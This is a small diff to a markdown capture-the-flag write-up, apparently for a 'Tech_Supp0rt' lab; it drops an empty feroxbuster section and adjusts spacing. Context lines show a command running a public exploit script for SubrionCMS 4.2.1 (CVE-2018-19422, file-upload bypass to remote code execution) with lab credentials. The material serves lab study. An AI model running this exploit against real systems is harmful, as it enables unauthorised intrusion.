@@ -123,13 +123,6 @@ Host script results:
 
 <br>
 
-<h3>feroxbuster</h3>
-
-```bash
-
-```
-
-<br>
 
 <h3>p2p-conficker</h3>
 
@@ -290,6 +283,7 @@ Disallow: /updates/
 
 
 <p>or</p>
+
 ```bash
 :~/Tech_Supp0rt# python3 49876.py -u http://TargetIP/subrion/panel/ -l admin -p Scam2021
 [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
